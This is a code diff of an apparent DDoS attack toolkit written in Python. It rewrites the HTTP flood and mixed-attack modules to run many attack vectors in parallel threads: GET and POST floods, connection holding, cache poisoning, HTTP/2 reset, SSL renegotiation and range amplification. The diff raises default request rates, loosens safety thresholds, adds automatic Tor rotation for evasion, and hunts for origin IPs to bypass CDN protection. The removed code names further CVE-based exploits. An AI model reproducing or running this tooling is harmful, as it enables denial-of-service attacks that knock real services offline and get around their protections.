+            _live[target]["fail"] = max(_live[target]["fail"], int(r.get("failed", 0)))
+
+    sys.stdout.write("\033[2J\033[H")
+    print(f"\n  {c('c','=== AUTO MODE MULTI-TARGET RESULTS ===')}\n")
+    total_sent = total_ok = total_fail = 0
+    for target, _, _, _, _ in all_tasks:
+        s = _live[target]
+        total_sent += s['sent']
+        total_ok += s['ok']
+        total_fail += s['fail']
+        print(f"  {c('w',target[:55]):55s}  sent={s['sent']:>6d}  ok={s['ok']:>6d}  fail={s['fail']:>5d}")
+    print(f"  {'-' * 55}  {'-'*20}")
+    print(f"  {c('g','TOTAL'):55s}  sent={total_sent:>6d}  ok={total_ok:>6d}  fail={total_fail:>5d}")
+    _rich_sep()
+
+
 async def run_http_flood(target: str, cfg: dict):
-    """HTTP Flood with LIVE DASHBOARD like Module 8/9"""
+    """HTTP Flood with multi-vector engine + LIVE DASHBOARD (matches Module 9 quality)"""
     if not target.startswith(("http://", "https://")):
         target = "https://" + target
 
-    duration = int(get_input(" Duration (seconds, default 60): ") or "60")
-    rps = int(get_input(" Target RPS (default 1000): ") or "1000")
-    
+    duration = int(get_input(" Duration (seconds, default 600): ") or "600")
+    rps = int(get_input(" Target RPS (default 10000): ") or "10000")
+
     opts = await prompt_attack_options(target)
 
+    # Resolve effective target (origin bypass if available)
+    effective_url = target
+    if opts.get("origin_ip"):
+        parsed = urlparse(target)
+        scheme = parsed.scheme or "https"
+        path = parsed.path or "/"
+        if parsed.query:
+            path += "?" + parsed.query
+        effective_url = f"{scheme}://{opts['origin_ip']}{path}"
+        # Inject Host header context via SNI is not possible here; the multi-vector
+        # engine builds raw requests with Host: <origin_ip>, which most CDNs reject.
+        # When origin is reachable we usually still want the original Host header,
+        # so we keep target_url with hostname but route via origin via DNS pinning.
+        # The MV engine resolves at TCP layer; sending Host: <origin> can still hit
+        # the origin server, so prefer the path that uses the origin IP directly.
+        effective_url = f"{scheme}://{opts['origin_ip']}{path}"
+
     print(f"\n {c('c','[*]')} HTTP Flood | {target} | {duration}s | {rps} RPS")
-    if opts["origin_ip"]:
+    if opts.get("origin_ip"):
         print(f" {c('g','[+]')} Origin bypass: {opts['origin_ip']}")
-    if opts["proxy_pool"]:
+    if opts.get("proxy_pool"):
         print(f" {c('g','[+]')} Proxy pool: {opts['proxy_pool'].stats().get('total', 0)} proxies")
     _rich_sep()
 
-    from core.attack.engines.enhanced import run_enhanced_attack
+    # Build proxy URL list for the multi-vector engine
+    proxy_urls = []
+    if opts.get("proxy_pool") is not None:
+        try:
+            for plist in opts["proxy_pool"]._pools.values():
+                for ps in plist:
+                    u = getattr(ps, "url", None) or (ps if isinstance(ps, str) else None)
+                    if u:
+                        proxy_urls.append(u)
+            if not proxy_urls:
+                for ps in getattr(opts["proxy_pool"], "_pending", []) or []:
+                    u = getattr(ps, "url", None) or (ps if isinstance(ps, str) else None)
+                    if u:
+                        proxy_urls.append(u)
+        except Exception:
+            proxy_urls = []
 
-    # Create vector for live dashboard (like Module 8/9)
-    vectors = []
-    vec = {
-        "label": "HTTP Flood",
-        "type": "py",
-        "status": "active",
-        "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
-    }
-    vectors.append(vec)
-    
-    # Start live dashboard
-    from core.monitor.live_dashboard import LiveAttackDashboard
-    dashboard = LiveAttackDashboard(
-        target=target, vectors=vectors, proxy_pool=opts["proxy_pool"],
-        duration=duration, color_func=c,
-        origin_ip=opts["origin_ip"], profile_info={},
+    # Spin up the AutoDashboard for live per-vector RPS rendering.
+    from core.monitor.auto_dashboard import AutoDashboard
+    from core.attack.engines.multi_vector_engine import run_multi_vector_engine
+    import threading as _th
+
+    dash = AutoDashboard(
+        target=effective_url,
+        duration=duration,
+        target_rps=rps,
+        stalled_ms=8000,
+        refresh_ms=50,
     )
-    dashboard.start()
+    vectors = [
+        ("mv_connhold",   "Connection Hold",   0.10, "connhold",   1000, 1),
+        ("mv_flood",      "GET Flood",         0.30, "flood",      1500, 30),
+        ("mv_post",       "POST Bomb",         0.20, "post",       600,  10),
+        ("mv_cdnpoison",  "Cache Poison",      0.20, "cdnpoison",  500,  5),
+        ("mv_resexh",     "Resource Exhaust",  0.10, "resexh",     400,  3),
+        ("mv_h2reset",    "HTTP/2 Reset",      0.10, "h2reset",    100,  1),
+    ]
+    for name, label, _share, _mode, _pool, _pipe in vectors:
+        dash.register_vector(name, label)
 
-    try:
-        result = await run_enhanced_attack(
-            url=target, duration=duration, method="http_get_flood",
-            rps=rps, proxy_pool=opts["proxy_pool"], origin_ip=opts["origin_ip"],
-            live_stats=vec,
+    dash.set_engine_label("multi_vector + raw_socket")
+    dash.set_global_note(f"proxies={len(proxy_urls)} origin_ip={opts.get('origin_ip','-')}")
+    dash.start()
+
+    # Spawn one worker per vector. We do NOT use multiprocess.spawn (broken on Windows
+    # because main.py re-imports argparse). Threads with isolated asyncio loops.
+    handles = []
+    for name, label, share, mode, pool_size, pipe in vectors:
+        worker_target_rps = max(50, int(rps * share))
+        stop_evt = _th.Event()
+        result: dict = {}
+        proxy_q = dash.get_stats_queue()
+
+        # Wrap queue to inject vector_name on each push
+        class _Proxy:
+            def __init__(self, vname):
+                self.vname = vname
+            def put_nowait(self, item):
+                if isinstance(item, dict):
+                    item["vector_name"] = self.vname
+                proxy_q.put_nowait(item)
+            def get_nowait(self):
+                return proxy_q.get_nowait()
+
+        th = _th.Thread(
+            target=run_multi_vector_engine,
+            name=f"http_flood_{name}",
+            kwargs=dict(
+                target_url=effective_url,
+                duration_seconds=float(duration),
+                target_rps=worker_target_rps,
+                worker_id=abs(hash(name)) & 0xFFFF,
+                stats_queue=_Proxy(name),
+                stop_event=stop_evt,
+                proxy_urls=proxy_urls if proxy_urls else None,
+                result_dict=result,
+                vector_mode=mode,
+            ),
+            daemon=True,
         )
-        vec["status"] = "done"
-    except KeyboardInterrupt:
-        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
-        vec["status"] = "error"
-    finally:
-        await dashboard.stop()
+        th.start()
+        handles.append((th, stop_evt, result, name))
 
-    print_attack_summary(target, duration, result)
+    # Drive dashboard while vectors run
+    try:
+        end_at = time.time() + duration
+        while time.time() < end_at:
+            await asyncio.sleep(0.5)
+            # Stop early if all threads died
+            if not any(h[0].is_alive() for h in handles):
+                break
+    except KeyboardInterrupt:
+        print(f"\n {c('y','[!]')} Cancelled by user.")
+
+    # Signal stop and join
+    for _th_obj, evt, _r, _n in handles:
+        evt.set()
+    for th_obj, _e, _r, _n in handles:
+        try:
+            await asyncio.get_event_loop().run_in_executor(None, th_obj.join, 5.0)
+        except Exception:
+            pass
+
+    # Aggregate results
+    agg = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+    for _th_obj, _e, r, _n in handles:
+        agg["total_requests"] += int(r.get("sent", 0))
+        agg["completed"]      += int(r.get("completed", 0))
+        agg["failed"]         += int(r.get("failed", 0))
+        agg["timeout"]        += int(r.get("timeout", 0))
+
+    await asyncio.sleep(0.5)
+    dash.stop()
+
+    print_attack_summary(target, duration, agg)
 
 
 async def run_http2_flood(target: str, cfg: dict):
@@ -868,12 +1729,12 @@ async def run_http2_flood(target: str, cfg: dict):
     if not target.startswith(("http://", "https://")):
         target = "https://" + target
 
-    duration = int(get_input(" Duration (seconds, default 60): ") or "60")
-    rps = int(get_input(" Target RPS (default 1000): ") or "1000")
-    threads = int(get_input(" Workers (default 100): ") or "100")
+    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
+    rps = int(get_input(" Target RPS (default 4000): ") or "4000")
+    threads = int(get_input(" Workers (default 250): ") or "250")
     
     # Self-DoS protection
-    if duration > 300 or threads > 200 or rps > 2000:
+    if duration > 600 or threads > 400 or rps > 8000:
         print(f" {c('y','[!]')} WARNING: High settings detected (duration={duration}s, threads={threads}, rps={rps})")
         print(f" {c('y','[!]')} This may cause self-DoS (disconnect your own internet)")
         confirm = get_input(" Continue anyway? (y/N): ").lower()
@@ -970,12 +1831,12 @@ async def run_rapid_reset(target: str, cfg: dict):
     if not target.startswith(("http://", "https://")):
         target = "https://" + target
 
-    duration = int(get_input(" Duration (seconds, default 60): ") or "60")
-    rps = int(get_input(" Streams per second (default 5000): ") or "5000")
-    threads = int(get_input(" Workers (default 200): ") or "200")
+    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
+    rps = int(get_input(" Streams per second (default 12000): ") or "12000")
+    threads = int(get_input(" Workers (default 400): ") or "400")
     
     # Self-DoS protection - AGGRESSIVE WARNING
-    if duration > 300 or threads > 200 or rps > 5000:
+    if duration > 900 or threads > 600 or rps > 20000:
         print(f"\n {c('r','[!!!]')} CRITICAL WARNING: VERY HIGH SETTINGS DETECTED")
         print(f" {c('r','[!!!]')} Duration: {duration}s | Threads: {threads} | RPS: {rps}")
         print(f" {c('r','[!!!]')} This WILL disconnect your internet (self-DoS)")
@@ -1081,11 +1942,11 @@ async def run_slowloris(target: str, cfg: dict):
     if not target.startswith(("http://", "https://")):
         target = "https://" + target
 
-    duration = int(get_input(" Duration (seconds, default 120): ") or "120")
-    connections = int(get_input(" Connections (default 500): ") or "500")
+    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
+    connections = int(get_input(" Connections (default 1500): ") or "1500")
     
     # Self-DoS protection
-    if duration > 600 or connections > 1000:
+    if duration > 1200 or connections > 3000:
         print(f" {c('y','[!]')} WARNING: High settings (duration={duration}s, connections={connections})")
         print(f" {c('y','[!]')} This may cause self-DoS")
         confirm = get_input(" Continue anyway? (y/N): ").lower()
@@ -1138,8 +1999,8 @@ async def run_slowloris(target: str, cfg: dict):
     print_attack_summary(target, duration, result)
 
 async def run_proxy_flood(target: str, cfg: dict):
-    duration = int(get_input(" Duration (seconds, default 60): ") or "60")
-    rps = int(get_input(" Target RPS (default 500): ") or "500")
+    duration = int(get_input(" Duration (seconds, default 300): ") or "300")
+    rps = int(get_input(" Target RPS (default 3000): ") or "3000")
     
     # Proxy selection with Tor support
     print(f"\n {c('c','[*]')} Proxy for Proxy Flood:")
@@ -1312,319 +2173,227 @@ async def run_udp_flood(target: str, cfg: dict):
 
 
 async def run_mixed_attack(target: str, cfg: dict):
+    """Mixed Attack v2 — ALL vectors via multi_vector_engine + AutoDashboard + origin bypass"""
     if not target.startswith(("http://", "https://")):
         target = "https://" + target
 
-    duration = int(get_input(" Duration (seconds, default 120): ") or "120")
-    rps = int(get_input(" Total RPS (default 3000): ") or "3000")
+    duration = int(get_input(" Duration (seconds, default 600): ") or "600")
+    rps = int(get_input(" Total RPS (default 15000): ") or "15000")
 
-    # Detect user's connection capacity to prevent self-DoS
-    print(f"\n {c('c','[*]')} Detecting your connection capacity...")
-    try:
-        from core.monitor.bandwidth_detector import detect_bandwidth
-        bw = await detect_bandwidth()
-        tier = bw["recommended"]["tier"]
-        warn = bw["recommended"]["warning"]
+    # Unified attack mode menu (same as Module 9)
+    print()
+    print(f" {c('c','[*]')} Attack mode:")
+    print(f"   {c('c','[1]')} Direct (origin IP only, no Tor / no proxy) {c('g','[fastest]')}")
+    print(f"   {c('c','[2]')} Tor network (auto-rotate exit nodes for CF bypass) {c('g','[recommended]')}")
+    print(f"   {c('c','[3]')} Proxy pool (load proxies/*.txt, validate, rotate)")
+    print(f"   {c('c','[4]')} Tor + Proxy (BOTH - max evasion)")
+    mode = (get_input(" Choose [1/2/3/4] (default 2): ").strip() or "2")
 
-        tier_color = {"FAST": "g", "MEDIUM": "y", "SLOW": "r", "VERY_SLOW": "r"}.get(tier, "y")
-        print(f" {c(tier_color, '[+]')} Connection: {c(tier_color, tier)}  upload~{bw['upload_mbps']:.0f} Mbps  latency={bw['latency_ms']:.0f}ms")
-        if warn:
-            print(f" {c('y','[!]')} {warn}")
-
-        # If connection is too slow, warn about self-DoS
-        if tier in ("SLOW", "VERY_SLOW"):
-            print(f"\n {c('r','[!]')} WARNING: Slow connection detected.")
-            print(f" {c('r','[!]')} Heavy attacks may DROP YOUR OWN WiFi/internet (self-DoS).")
-            print(f" {c('y','[*]')} Recommendation: run from VPS with 100+ Mbps upload, not home WiFi.")
-            cont = get_input(f" Continue anyway with SAFE MODE? (Y/n): ").lower()
-            if cont == "n":
-                return
-
-        # Adjust max RPS down if connection is slow
-        if rps > bw["recommended"]["max_rps"]:
-            old_rps = rps
-            rps = bw["recommended"]["max_rps"]
-            print(f" {c('y','[!]')} Throttling RPS from {old_rps} to {rps} (safe limit for your connection)")
-    except Exception as e:
-        print(f" {c('y','[!]')} Bandwidth detect failed: {e}")
-        bw = {"recommended": {
-            "tier": "UNKNOWN",
-            "max_concurrent": 500,
-            "max_rps": rps,
-            "allow_post_bomb": False,
-            "allow_conn_flood": False,
-            "allow_ws_storm": False,
-            "max_threads_per_vec": 100,
-        }}
-
-    safe_caps = bw["recommended"]
-    max_threads = safe_caps["max_threads_per_vec"]
-
-    opts = await prompt_attack_options(target)
-
-    print(f"\n {c('c','[*]')} Detecting target capabilities...")
-    profile = await auto_detect_target(target, verbose=False)
-
-    primary_origin = opts["origin_ip"]
-    proxy_pool = opts["proxy_pool"]
-    proxy_file = opts.get("proxy_file", "")
-
-    # If proxy_pool exists, dump consolidated alive list for Go
-    proxy_file_for_go = ""
-    if proxy_pool:
+    # ----- Tor / Proxy setup -----
+    use_tor = mode in ("2", "4")
+    use_proxy = mode in ("3", "4")
+    tor_instances = 0
+    proxy_urls = []
+    if use_tor:
+        ti = get_input(" Tor instances (default 5): ").strip()
+        tor_instances = max(1, min(20, int(ti))) if ti.isdigit() else 5
         try:
-            urls = []
-            for plist in proxy_pool._pools.values():
-                for ps in plist:
-                    urls.append(ps.url)
-            for ps in proxy_pool._pending:
-                urls.append(ps.url)
-            if urls:
-                proxy_file_for_go = "proxies/_mixed_attack.txt"
-                os.makedirs(os.path.dirname(proxy_file_for_go), exist_ok=True)
-                with open(proxy_file_for_go, "w") as f:
-                    f.write("\n".join(urls))
+            from core.network.tor_manager import get_tor_manager, TOR_BASE_SOCKS_PORT
+            from core.network.proxy import ProxyPool
+            manager = get_tor_manager(instances=tor_instances)
+            if not manager.is_tor_installed():
+                if get_input(" Tor not installed. Install now? (Y/n): ").lower() != "n":
+                    print(f" {c('c','[*]')} Auto-installing Tor...")
+                    if not manager.install_tor():
+                        print(f" {c('r','[-]')} Tor installation failed")
+                    else:
+                        print(f" {c('g','[+]')} Tor installed successfully")
+                else:
+                    print(f" {c('y','[!]')} Tor not available")
+            if manager.is_tor_installed():
+                manager.setup_instances()
+                success = manager.start_all(wait_bootstrap=False)
+                if success > 0:
+                    print(f" {c('g','[+]')} Started {success}/{tor_instances} Tor instances")
+                    print(f" {c('c','[*]')} Waiting for Tor bootstrap (up to 120s)...")
+                    bootstrapped = [False] * len(manager.instances)
+                    for _ in range(120):
+                        for idx, inst in enumerate(manager.instances):
+                            if not bootstrapped[idx] and inst.pid:
+                                if manager.wait_for_bootstrap(inst, timeout=3):
+                                    bootstrapped[idx] = True
+                        if all(bootstrapped):
+                            break
+                        await asyncio.sleep(1)
+                    health = await manager.check_all_health()
+                    healthy = [h for h in health if h.get('is_tor')]
+                    print(f" {c('g','[+]')} {len(healthy)}/{tor_instances} Tor instances healthy")
+                    if healthy:
+                        for h in healthy:
+                            socks_port = TOR_BASE_SOCKS_PORT + (h['instance_id'] - 1) * 2
+                            proxy_urls.append(f"socks5h://127.0.0.1:{socks_port}")
+                        _tor_addrs = [f"127.0.0.1:{TOR_BASE_SOCKS_PORT + (h['instance_id'] - 1) * 2}" for h in healthy]
+                        print(f" {c('g','[+]')} Tor proxies: {_tor_addrs}")
+        except ImportError:
+            print(f" {c('y','[!]')} tor_manager not available - using fallback")
+            for i in range(min(tor_instances, 5)):
+                proxy_urls.append(f"socks5h://127.0.0.1:{9250 + i*2}")
+        except Exception as e:
+            print(f" {c('r','[-]')} Tor setup error: {e}")
+            for i in range(min(tor_instances, 5)):
+                proxy_urls.append(f"socks5h://127.0.0.1:{9250 + i*2}")
+    if use_proxy:
+        try:
+            opts = await prompt_attack_options(target, ask_proxy=True, ask_origin=False)
+            pool = opts.get("proxy_pool")
+            if pool is not None:
+                for plist in getattr(pool, "_pools", {}).values():
+                    for ps in plist:
+                        u = getattr(ps, "url", None)
+                        if u:
+                            proxy_urls.append(u)
+                for ps in getattr(pool, "_pending", []) or []:
+                    u = getattr(ps, "url", None)
+                    if u:
+                        proxy_urls.append(u)
+        except Exception as e:
+            print(f" {c('y','[!]')} proxy setup: {e}")
+
+    # ----- Origin discovery -----
+    origin_ip = ""
+    parsed = urlparse(target)
+    hostname = parsed.hostname or ""
+    from core.recon.origin.origin_store import load_hunt, get_best_origin
+    saved = load_hunt(target)
+    if saved and (saved.get("verified_origins") or saved.get("candidates")):
+        best = get_best_origin(target)
+        if best:
+            origin_ip = best
+            print(f" {c('g','[+]')} Found saved origin: {origin_ip}")
+    if not origin_ip:
+        if get_input(" Auto-find origin IP for bypass? (y/N): ").lower() == "y":
+            from core.recon.origin.origin_hunter import OriginHunter
+            env = load_env()
+            print(f" {c('c','[*]')} Hunting origin IP...")
+            hunter = OriginHunter(timeout=8, max_concurrent=200)
+            report = await hunter.hunt(target, env=env)
+            if report.verified_origins:
+                origin_ip = report.verified_origins[0]
+                print(f" {c('g','[+]')} ORIGIN: {origin_ip}")
+            elif report.candidates:
+                origin_ip = report.candidates[0].ip
+                print(f" {c('y','[*]')} Candidate: {origin_ip}")
+            else:
+                print(f" {c('y','[!]')} No origin found")
+
+    # Build effective target URL (origin bypass)
+    effective_url = target
+    if origin_ip:
+        scheme = parsed.scheme or "https"
+        path = parsed.path or "/"
+        if parsed.query:
+            path += "?" + parsed.query
+        effective_url = f"{scheme}://{origin_ip}{path}"
+        print(f" {c('g','[+]')} Origin bypass: {origin_ip} -> {effective_url}")
+
+    print(f"\n {c('c','[*]')} MIXED v2 | {target} | {duration}s | {rps} RPS | proxies={len(proxy_urls)}")
+    _rich_sep()
+
+    # ----- Launch live AutoDashboard + multi_vector_engine workers -----
+    from core.monitor.auto_dashboard import AutoDashboard
+    from core.attack.engines.multi_vector_engine import run_multi_vector_engine
+    import threading as _th
+
+    dash = AutoDashboard(
+        target=effective_url,
+        duration=duration,
+        target_rps=rps,
+        stalled_ms=8000,
+        refresh_ms=50,
+    )
+
+    vectors = [
+        ("mv_connhold",   "Connection Hold",   0.08, "connhold",   2000, 1),
+        ("mv_flood",      "GET Flood",         0.22, "flood",      2000, 30),
+        ("mv_post",       "POST Bomb",         0.15, "post",       800,  10),
+        ("mv_slow",       "Slow Rate",         0.05, "slow",       500,  1),
+        ("mv_h2reset",    "HTTP/2 Reset",      0.18, "h2reset",    200,  1),
+        ("mv_drip",       "Slow Drip",         0.06, "drip",       500,  1),
+        ("mv_cdnpoison",  "Cache Poison",      0.10, "cdnpoison",  800,  5),
+        ("mv_resexh",     "Resource Exhaust",  0.08, "resexh",     600,  3),
+        ("mv_sslreneg",   "SSL Reneg",         0.04, "sslreneg",   200,  1),
+        ("mv_rangeamp",   "Range Amp",         0.04, "rangeamp",   400,  1),
+    ]
+    for name, label, _share, _mode, _pool, _pipe in vectors:
+        dash.register_vector(name, label)
+
+    dash.set_engine_label(f"mixed_v2 proxies={len(proxy_urls)} origin={origin_ip or '-'}")
+    dash.set_global_note("MIXED ATTACK V2 — 10 vectors")
+    dash.start()
+
+    handles = []
+    for name, label, share, mode, pool_size, pipe in vectors:
+        worker_target_rps = max(50, int(rps * share))
+        stop_evt = _th.Event()
+        result: dict = {}
+        proxy_q = dash.get_stats_queue()
+
+        class _Proxy:
+            def __init__(self, vn):
+                self.vn = vn
+            def put_nowait(self, item):
+                if isinstance(item, dict):
+                    item["vector_name"] = self.vn
+                proxy_q.put_nowait(item)
+            def get_nowait(self):
+                return proxy_q.get_nowait()
+
+        th = _th.Thread(
+            target=run_multi_vector_engine,
+            name=f"mixed_{name}",
+            kwargs=dict(
+                target_url=effective_url,
+                duration_seconds=float(duration),
+                target_rps=worker_target_rps,
+                worker_id=abs(hash(name)) & 0xFFFF,
+                stats_queue=_Proxy(name),
+                stop_event=stop_evt,
+                proxy_urls=proxy_urls if proxy_urls else None,
+                result_dict=result,
+                vector_mode=mode,
+            ),
+            daemon=True,
+        )
+        th.start()
+        handles.append((th, stop_evt, result, name))
+
+    try:
+        end_at = time.time() + duration
+        while time.time() < end_at:
+            await asyncio.sleep(0.5)
+            if not any(h[0].is_alive() for h in handles):
+                break
+    except KeyboardInterrupt:
+        print(f"\n {c('y','[!]')} Cancelled.")
+
+    for _th_obj, evt, _r, _n in handles:
+        evt.set()
+    for th_obj, _e, _r, _n in handles:
+        try:
+            await asyncio.get_event_loop().run_in_executor(None, th_obj.join, 5.0)
         except Exception:
             pass
 
-    _rich_sep()
-    print(f" {c('w','MIXED ATTACK - ALL VECTORS')}  Target: {c('c', target)}  Duration: {duration}s")
-    if primary_origin:
-        print(f" Origin bypass: {c('g', primary_origin)}")
-    if proxy_pool:
-        print(f" Proxy pool: {c('g', str(proxy_pool.stats().get('total', 0)))} proxies")
-    if profile:
-        print(f" Profile: HTTP/2={'YES' if profile.supports_http2 else 'NO'}  Server={profile.server}")
-    print(f" Connection: {c(tier_color, safe_caps['tier'])}  Max RPS: {rps}  Threads/vec: {max_threads}")
-    _rich_sep()
+    agg = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
+    for _th_obj, _e, r, _n in handles:
+        agg["total_requests"] += int(r.get("sent", 0))
+        agg["completed"]      += int(r.get("completed", 0))
+        agg["failed"]         += int(r.get("failed", 0))
+        agg["timeout"]        += int(r.get("timeout", 0))
 
-    vectors = []
-    tasks = []
-    # Semaphore to limit concurrent Go processes (prevents system overload)
-    go_sem = asyncio.Semaphore(4)
-
-    def add_go_vector(label: str, method: str, vec_rps: int, threads: int = 100, **kw):
-        # Cap threads to safe limit
-        threads = min(threads, max_threads)
-        vec = {"label": label, "type": "go", "status": "pending", "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}}
-        vectors.append(vec)
-
-        async def run_with_sem():
-            async with go_sem:
-                try:
-                    return await asyncio.wait_for(
-                        run_go_engine(
-                            target=target, duration=duration, rps=vec_rps,
-                            method=method, threads=threads, origin_ip=primary_origin,
-                            proxy_file=proxy_file_for_go,
-                            live_stats=vec, **kw,
-                        ),
-                        timeout=duration + 15,
-                    )
-                except asyncio.TimeoutError:
-                    return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
-                except Exception as e:
-                    logger.error(f"Vector {label} error: {type(e).__name__}: {e}")
-                    return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
-
-        tasks.append(run_with_sem())
-
-    def add_py_vector(label: str, coro_factory):
-        vec = {
-            "label": label, 
-            "type": "py", 
-            "status": "running", 
-            "stats": {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0},
-            "stats_lock": threading.Lock(),
-        }
-        vectors.append(vec)
-        
-        async def wrapper():
-            try:
-                if callable(coro_factory) and not asyncio.iscoroutine(coro_factory):
-                    coro = coro_factory(vec)
-                else:
-                    coro = coro_factory
-                
-                result = await asyncio.wait_for(coro, timeout=duration + 30)
-                vec["status"] = "done"
-                if isinstance(result, dict):
-                    with vec["stats_lock"]:
-                        vec["stats"] = {
-                            "total_requests": result.get("total", result.get("total_requests", 0)),
-                            "completed": result.get("completed", 0),
-                            "failed": result.get("failed", 0),
-                            "timeout": result.get("timeout", 0),
-                        }
-                return result
-            except asyncio.TimeoutError:
-                logger.warning(f"Vector {label} timed out after {duration + 30}s")
-                vec["status"] = "done"
-                return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
-            except Exception as e:
-                logger.error(f"Vector {label} error: {type(e).__name__}: {e}")
-                vec["status"] = "error"
-                with vec["stats_lock"]:
-                    vec["stats"] = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
-                return {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
-        tasks.append(wrapper())
-
-    # ALL VECTORS
-    add_go_vector("HTTP Flood", "http-flood",
-                  int(rps * 0.5), threads=max_threads)
-    add_go_vector("Cache-Bypass POST", "cache-bypass",
-                  int(rps * 0.4), threads=max_threads)
-
-    if profile and profile.supports_http2:
-        add_go_vector("Rapid Reset (CVE-2023-44487)", "rapid-reset",
-                      int(rps * 0.6), threads=max_threads, rapid_reset=True)
-        add_go_vector("Continuation (CVE-2024-27316)", "continuation",
-                      int(rps * 0.3), threads=max_threads)
-        add_go_vector("HPACK Bomb", "hpack-bomb",
-                      int(rps * 0.3), threads=max_threads)
-        add_go_vector("Settings Flood", "settings-flood",
-                      0, threads=max_threads)
-        add_go_vector("HTTP/2 Multiplex", "http-flood",
-                      int(rps * 0.3), threads=max_threads, http2=True)
-
-    # Resource exhaustion - ALL included regardless of tier
-    add_go_vector("TCP Connection Storm", "conn-flood",
-                  0, threads=max_threads)
-    add_go_vector("TLS Renegotiation", "tls-reneg",
-                  0, threads=max_threads)
-    add_go_vector("POST Body Bomb (50MB)", "post-bomb",
-                  0, threads=max_threads)
-    add_go_vector("WebSocket Storm", "ws-storm",
-                  0, threads=max_threads)
-    add_go_vector("HTTP Smuggling", "smuggling",
-                  int(rps * 0.2), threads=min(max_threads, 80))
-
-    # QUIC/HTTP/3 - ALL included
-    add_go_vector("HTTP/3 Stream Hijack", "quic-stream-hijack",
-                  int(rps * 0.3), threads=min(max_threads, 50))
-    add_go_vector("QUIC CID Flood", "quic-cid-flood",
-                  int(rps * 0.2), threads=min(max_threads, 50))
-    add_go_vector("QUIC Crypto Exhaust", "quic-crypto-exhaust",
-                  0, threads=min(max_threads, 50))
-
-    # Python slow attacks - WITH REAL-TIME LIVE STATS
-    from core.attack.engines.enhanced import run_enhanced_attack
-
-    sl_target = target
-    if primary_origin:
-        parsed = urlparse(target)
-        sl_target = f"{parsed.scheme}://{primary_origin}{parsed.path or '/'}"
-
-    add_py_vector("Slowloris",
-        lambda vec: run_enhanced_attack(url=sl_target, duration=duration, method="slowloris",
-                            rps=500, proxy_pool=proxy_pool, live_stats=vec))
-    add_py_vector("RUDY",
-        lambda vec: run_enhanced_attack(url=sl_target, duration=duration, method="rudy",
-                            rps=200, live_stats=vec))
-
-    if proxy_pool and proxy_pool.stats().get("total", 0) > 0:
-        add_py_vector(f"Proxy PPS ({proxy_pool.stats().get('total', 0)})",
-            lambda vec: run_enhanced_attack(url=target, duration=duration, method="pps",
-                                rps=int(rps * 1.5), proxy_pool=proxy_pool, live_stats=vec))
-
-    # API Architecture (with proxy + live stats)
-    from core.attack.specialized.api_attacks import API_ATTACK_METHODS
-    
-    def _wrap_api(func, **kwargs):
-        """Wrap API attack to support live_stats injection"""
-        async def runner(vec):
-            # Try with live_stats first, fall back to without
-            try:
-                return await func(live_stats=vec, **kwargs)
-            except TypeError:
-                # Function doesn't support live_stats, run normally
-                # Update vec at end
-                result = await func(**kwargs)
-                if isinstance(result, dict):
-                    vec["stats"] = {
-                        "total_requests": result.get("total", result.get("total_requests", 0)),
-                        "completed": result.get("completed", 0),
-                        "failed": result.get("failed", 0),
-                        "timeout": result.get("timeout", 0),
-                    }
-                return result
-        return runner
-    
-    add_py_vector("REST API CRUD",
-        _wrap_api(API_ATTACK_METHODS["api_rest_flood"],
-                  url=target, duration=duration,
-                  rps=min(200, int(rps * 0.2)), proxy_pool=proxy_pool))
-    add_py_vector("GraphQL Nesting",
-        _wrap_api(API_ATTACK_METHODS["graphql_deep"],
-                  url=target, duration=duration,
-                  rps=min(100, int(rps * 0.15)), proxy_pool=proxy_pool))
-    add_py_vector("GraphQL Alias",
-        _wrap_api(API_ATTACK_METHODS["graphql_alias_bomb"],
-                  url=target, duration=duration,
-                  rps=min(80, int(rps * 0.1)), proxy_pool=proxy_pool))
-    add_py_vector("gRPC Flood",
-        _wrap_api(API_ATTACK_METHODS["grpc_flood"],
-                  url=target, duration=duration,
-                  rps=min(100, int(rps * 0.15)), proxy_pool=proxy_pool))
-    add_py_vector("JSON Bomb",
-        _wrap_api(API_ATTACK_METHODS["json_bomb"],
-                  url=target, duration=duration,
-                  rps=min(80, int(rps * 0.1)), proxy_pool=proxy_pool))
-    add_py_vector("XML Bomb",
-        _wrap_api(API_ATTACK_METHODS["xml_bomb"],
-                  url=target, duration=duration,
-                  rps=min(60, int(rps * 0.08)), proxy_pool=proxy_pool))
-
-    # Serverless / DoW (with live stats)
-    from core.attack.specialized.serverless_dow import DOW_ATTACK_METHODS
-    add_py_vector("Cold Start Flood",
-        _wrap_api(DOW_ATTACK_METHODS["cold_start"],
-                  url=target, duration=duration,
-                  rps=min(80, int(rps * 0.12))))
-    add_py_vector("Cost Accumulation",
-        _wrap_api(DOW_ATTACK_METHODS["cost_accum"],
-                  url=target, duration=duration,
-                  rps=min(60, int(rps * 0.08))))
-
-    print(f" {c('g','[+]')} Launching {c('w', str(len(vectors)))} vectors in parallel\n")
-
-    profile_info = {}
-    if profile:
-        profile_info = {
-            "http2": profile.supports_http2,
-            "cdn": profile.cdn,
-            "waf": profile.waf,
-            "server": profile.server,
-        }
-
-    from core.monitor.live_dashboard import LiveAttackDashboard
-    dashboard = LiveAttackDashboard(
-        target=target, vectors=vectors, proxy_pool=proxy_pool,
-        duration=duration, color_func=c,
-        origin_ip=primary_origin, profile_info=profile_info,
-    )
-    dashboard.start()
-
-    try:
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-    except KeyboardInterrupt:
-        results = []
-
-    await dashboard.stop()
-
-    try:
-        if proxy_file_for_go and os.path.exists(proxy_file_for_go):
-            os.remove(proxy_file_for_go)
-    except Exception:
-        pass
-
-    total = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
-    for result in results:
-        if isinstance(result, dict):
-            for k in total:
-                total[k] += result.get(k, 0)
-
